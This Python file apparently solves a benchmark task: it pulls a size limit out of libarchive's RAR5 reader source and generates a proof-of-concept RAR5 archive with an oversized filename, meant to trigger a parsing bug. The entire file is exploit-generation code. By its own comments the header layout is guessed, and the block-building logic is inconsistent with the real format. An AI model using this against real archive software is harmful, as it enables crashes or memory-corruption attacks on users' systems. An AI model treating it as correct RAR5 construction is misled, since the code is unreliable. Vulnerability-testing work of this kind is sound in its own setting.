import os
import re
import tarfile
import zlib


def _encode_varint_le(value: int) -> bytes:
    """Encode an integer using little-endian base-128 (LEB128-like) varint."""
    out = bytearray()
    v = value
    while True:
        b = v & 0x7F
        v >>= 7
        if v:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _extract_rar5_max_name_size(src_path: str) -> int:
    """
    Try to extract RAR5_MAX_NAME_SIZE (or similar) from the C source.
    Fallback to a reasonable default if not found.
    """
    max_name = None
    try:
        with tarfile.open(src_path, 'r:*') as tf:
            member = None
            for m in tf.getmembers():
                name_lower = m.name.lower()
                if name_lower.endswith('archive_read_support_format_rar5.c'):
                    member = m
                    break
            if member is None:
                return 1024  # default fallback

            f = tf.extractfile(member)
            if f is None:
                return 1024
            src = f.read().decode('utf-8', 'ignore')

        # Look for a define like: #define RAR5_MAX_NAME_SIZE 1024
        m = re.search(r'RAR5_MAX_NAME_SIZE\s+(\d+)', src)
        if m:
            max_name = int(m.group(1))
        else:
            # Also try variants like (1U << 16)
            m = re.search(r'RAR5_MAX_NAME_SIZE\s+\(?\s*(\d+)\s*U?\s*<<\s*(\d+)\s*\)?', src)
            if m:
                base = int(m.group(1))
                shift = int(m.group(2))
                max_name = base << shift
    except Exception:
        return 1024

    if not max_name or max_name <= 0:
        return 1024
    # Cap it for sanity (avoid gigantic PoCs)
    return min(max_name, 4096)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to learn the maximum allowed name size from the source.
        max_name = _extract_rar5_max_name_size(src_path)
        # Make the name just one byte larger than allowed, but also reasonably small.
        name_len = max_name + 1

        # Construct an oversized filename.
        # Use a single directory component and a simple extension to keep it realistic.
        base_name = b"A" * name_len

        # Encode name length using a LEB128-style varint.
        name_len_var = _encode_varint_le(name_len)

        # RAR5 magic signature (RAR5 archives)
        magic = b"Rar!\x1a\x07\x01\x00"

        # Helper to build a generic block with our guessed header layout:
        # [CRC32 (4)] [HEAD_SIZE (2)] [TYPE (1)] [FLAGS (2)] [header_data (HEAD_SIZE-3)]
        def build_block(block_type: int, flags: int, header_data: bytes) -> bytes:
            body = bytes([block_type]) + flags.to_bytes(2, "little") + header_data
            head_size = len(body) - 0  # bytes from TYPE (inclusive) to end
            # According to our guess, HEAD_SIZE is size from TYPE field to end of header.
            # Minimal HEAD_SIZE includes TYPE(1)+FLAGS(2) = 3, so must be >=3.
            if head_size < 3:
                head_size = 3
            body = body[:1] + body[1:3] + header_data  # just ensure structure

            crc = zlib.crc32(body) & 0xFFFFFFFF
            return crc.to_bytes(4, "little") + head_size.to_bytes(2, "little") + body

        # Build a minimal main header block (TYPE=1). We don't know exact fields, so we
        # keep header_data tiny (all zeros) hoping the parser treats missing fields as defaults.
        main_header_data = b"\x00\x00\x00\x00"  # guessed minimal payload
        main_block = build_block(block_type=1, flags=0, header_data=main_header_data)

        # Build several file header variants with different "prefix padding" before the
        # name_len varint, to increase the chance that one layout matches the real parser.
        file_blocks = []

        # Try multiple prefix lengths (number of raw zero bytes before the length varint).
        for prefix_len in range(0, 8):
            prefix = b"\x00" * prefix_len
            # Place the length field followed by the name.
            header_data = prefix + name_len_var + base_name
            file_block = build_block(block_type=2, flags=0, header_data=header_data)
            file_blocks.append(file_block)

        poc = magic + main_block + b"".join(file_blocks)
        return poc
